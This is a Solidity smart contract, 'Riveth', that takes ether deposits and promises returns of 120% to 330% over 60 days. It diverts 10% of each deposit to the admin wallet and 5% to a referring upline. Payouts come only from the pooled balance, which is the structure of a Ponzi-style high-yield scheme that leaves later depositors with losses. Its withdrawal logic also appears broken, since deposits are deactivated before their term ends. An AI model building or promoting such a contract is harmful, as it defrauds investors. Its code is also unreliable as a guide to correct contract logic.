1 pragma solidity ^0.4.24;
2 
3 
4 library SafeMath {
5 
6   /**
7   * @dev Multiplies two numbers, reverts on overflow.
8   */
9   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
10     // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
11     // benefit is lost if 'b' is also tested.
12     // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
13     if (a == 0) {
14       return 0;
15     }
16 
17     uint256 c = a * b;
18     require(c / a == b);
19 
20     return c;
21   }
22 
23   /**
24   * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
25   */
26   function div(uint256 a, uint256 b) internal pure returns (uint256) {
27     require(b > 0); // Solidity only automatically asserts when dividing by 0
28     uint256 c = a / b;
29     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
30 
31     return c;
32   }
33 
34   /**
35   * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
36   */
37   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
38     require(b <= a);
39     uint256 c = a - b;
40 
41     return c;
42   }
43 
44   /**
45   * @dev Adds two numbers, reverts on overflow.
46   */
47   function add(uint256 a, uint256 b) internal pure returns (uint256) {
48     uint256 c = a + b;
49     require(c >= a);
50 
51     return c;
52   }
53 
54   /**
55   * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
56   * reverts when dividing by zero.
57   */
58   function mod(uint256 a, uint256 b) internal pure returns (uint256) {
59     require(b != 0);
60     return a % b;
61   }
62 }
63 
64 library AddressUtils {
65     function isContract(address _addr) internal view returns (bool) {
66         uint256 size;
67         assembly {size := extcodesize(_addr)}
68         return size > 0;
69     }
70 }
71 
72 library Helpers {
73     function walletFromData(bytes data) internal pure returns (address wallet) {
74         assembly {
75             wallet := mload(add(data, 20))
76         }
77     }
78 }
79 
80 contract Riveth {
81     using SafeMath for uint256;
82     using AddressUtils for address;
83 
84     address public adminWallet;
85 
86     uint256 constant public DEPOSIT_MIN = 10 finney;
87     uint256 constant public DEPOSIT_MAX = 50 ether;
88     uint256 constant public DEPOSIT_PERIOD = 60 days;
89     uint256 constant public DEPOSIT_COUNT_LIMIT = 5;
90     uint256 constant public TOTAL_BASE_PERCENT = 120;
91     uint256 constant public UPLINE_BASE_PERCENT = 5;
92     uint256 constant public UPLINE_MIN_DEPOSIT = 10 finney;
93     uint256 constant public EXPENSES_PERCENT = 10;
94 
95     uint256 public totalDeposited = 0;
96     uint256 public totalWithdrawn = 0;
97     uint256 public usersCount = 0;
98     uint256 public depositsCount = 0;
99 
100     mapping(address => User) public users;
101     mapping(uint256 => Deposit) public deposits;
102 
103     struct Deposit {
104         uint256 createdAt;
105         uint256 endAt;
106         uint256 amount;
107         uint256 accrued;
108         bool active;
109     }
110 
111     struct User {
112         uint256 createdAt;
113         address upline;
114         uint256 totalDeposited;
115         uint256 totalWithdrawn;
116         uint256 activeDepositsCount;
117         uint256 activeDepositsAmount;
118         uint256[] deposits;
119     }
120 
121     modifier onlyAdmin() {
122         require(msg.sender == adminWallet);
123         _;
124     }
125 
126     constructor() public {
127         adminWallet = msg.sender;
128         createUser(msg.sender, address(0));
129     }
130 
131     function createUser(address wallet, address upline) internal {
132         users[wallet] = User({
133             createdAt : now,
134             upline : upline,
135             totalDeposited : 0,
136             totalWithdrawn : 0,
137             activeDepositsCount : 0,
138             activeDepositsAmount : 0,
139             deposits : new uint256[](0)
140             });
141         usersCount++;
142     }
143 
144     function createDeposit() internal {
145         User storage user = users[msg.sender];
146         uint256 amount = msg.value;
147 
148         Deposit memory deposit = Deposit({
149             createdAt : now,
150             endAt : now.add(DEPOSIT_PERIOD),
151             amount : amount,
152             accrued : 0,
153             active : true
154         });
155 
156         deposits[depositsCount] = deposit;
157         user.deposits.push(depositsCount);
158 
159         user.totalDeposited = user.totalDeposited.add(amount);
160         totalDeposited = amount.add(totalDeposited);
161 
162         depositsCount++;
163         user.activeDepositsCount++;
164         user.activeDepositsAmount = user.activeDepositsAmount.add(amount);
165 
166         adminWallet.transfer(amount.mul(EXPENSES_PERCENT).div(100));
167 
168         uint256 uplineFee = amount.mul(UPLINE_BASE_PERCENT).div(100);
169         transferUplineFee(uplineFee);
170     }
171 
172     function transferUplineFee(uint256 amount) internal {
173         User storage user = users[msg.sender];
174         
175         if (user.upline != address(0)) {
176             user.upline.transfer(amount);
177         }
178     }
179 
180     function getUpline() internal view returns (address){
181         address uplineWallet = Helpers.walletFromData(msg.data);
182 
183         return users[uplineWallet].createdAt > 0 
184         && users[uplineWallet].totalDeposited >= UPLINE_MIN_DEPOSIT 
185         && msg.sender != uplineWallet
186         ? uplineWallet
187         : adminWallet;
188     }
189 
190     function() payable public {
191         require(msg.sender != address(0), 'Address incorrect');
192         require(!msg.sender.isContract(), 'Address is contract');
193         require(msg.value <= DEPOSIT_MAX, 'Amount too big');
194 
195         User storage user = users[msg.sender];
196 
197         if (user.createdAt == 0) {
198             createUser(msg.sender, getUpline());
199         }
200 
201         if (msg.value >= DEPOSIT_MIN) {
202             require(user.activeDepositsCount < DEPOSIT_COUNT_LIMIT, 'Active deposits count limit');
203             createDeposit();
204         } else {
205             accrueDeposits();
206         }
207     }
208 
209     function accrueDeposits() internal {
210         User storage user = users[msg.sender];
211 
212         for (uint i = 0; i < user.deposits.length; i++) {
213             if(deposits[user.deposits[i]].active){
214                 accrueDeposits(user.deposits[i]);
215             }
216         }
217     }
218 
219     function accrueDeposits(uint256 depositId) internal {
220         User storage user = users[msg.sender];
221         Deposit storage deposit = deposits[depositId];
222         uint256 amount = getAccrualAmount(depositId);
223 
224         withdraw(msg.sender, amount);
225 
226         deposit.accrued = deposit.accrued.add(amount);
227 
228         if (deposit.endAt >= now) {
229             deposit.active = false;
230             user.activeDepositsCount--;
231             user.activeDepositsAmount = user.activeDepositsAmount.sub(deposit.amount);
232         }
233     }
234 
235     function getAccrualAmount(uint256 depositId) internal view returns (uint256){
236         Deposit storage deposit = deposits[depositId];
237         uint256 totalProfit = totalForAccrual(msg.sender, depositId);
238         uint256 amount = totalProfit
239         .mul(
240             now.sub(deposit.createdAt)
241         )
242         .div(DEPOSIT_PERIOD)
243         .sub(deposit.accrued);
244 
245         if (amount.add(deposit.accrued) > totalProfit) {
246             amount = totalProfit.sub(deposit.accrued);
247         }
248         return amount;
249     }
250 
251 
252     function withdraw(address wallet, uint256 amount) internal {
253         wallet.transfer(amount);
254         totalWithdrawn = totalWithdrawn.add(amount);
255         users[wallet].totalWithdrawn = users[wallet].totalWithdrawn.add(amount);
256     }
257 
258     function getUserDeposits(address _address) public view returns (uint256[]){
259         return users[_address].deposits;
260     }
261 
262     function getGlobalPercent() public view returns (uint256){
263         uint256 balance = address(this).balance;
264         if(balance >= 5000 ether){
265             //5.5% daily
266             return 330;
267         }
268         if(balance >= 3000 ether){
269             //5% daily
270             return 300;
271         }
272         if(balance >= 1000 ether){
273             //4.5% daily
274             return 270;
275         }
276         if(balance >= 500 ether){
277             //4% daily
278             return 240;
279         }
280         if(balance >= 200 ether){
281             //3.5% daily
282             return 210;
283         }
284         if(balance >= 100 ether){
285             //3% daily
286             return 180;
287         }
288         if(balance >= 50 ether){
289             //2.5% daily
290             return 150;
291         }
292         return TOTAL_BASE_PERCENT;
293     }
294 
295     function getLocalPercent() public view returns (uint256){
296         return getLocalPercent(msg.sender);
297     }
298 
299     function getLocalPercent(address user) public view returns (uint256){
300         uint256 activeDepositsAmount = users[user].activeDepositsAmount;
301         if(activeDepositsAmount >= 250 ether){
302             //5.5% daily
303             return 330;
304         }
305         if(activeDepositsAmount >= 150 ether){
306             //5% daily
307             return 300;
308         }
309         if(activeDepositsAmount >= 50 ether){
310             //4.5% daily
311             return 270;
312         }
313         if(activeDepositsAmount >= 25 ether){
314             //4% daily
315             return 240;
316         }
317         if(activeDepositsAmount >= 10 ether){
318             //3.5% daily
319             return 210;
320         }
321         if(activeDepositsAmount >= 5 ether){
322             //3% daily
323             return 180;
324         }
325         if(activeDepositsAmount >= 3 ether){
326             //2.5% daily
327             return 150;
328         }
329 
330         return TOTAL_BASE_PERCENT;
331     }
332 
333     function getIndividualPercent() public view returns (uint256){
334         return getIndividualPercent(msg.sender);
335     }
336 
337     function getIndividualPercent(address user) public view returns (uint256){
338         uint256 globalPercent = getGlobalPercent();
339         uint256 localPercent = getLocalPercent(user);
340         return globalPercent >= localPercent ? globalPercent : localPercent;
341     }
342     
343     function totalForAccrual(address user, uint256 depositId) public view returns (uint256){
344         return deposits[depositId].amount.mul(getIndividualPercent(user)).div(100);
345     }
346 }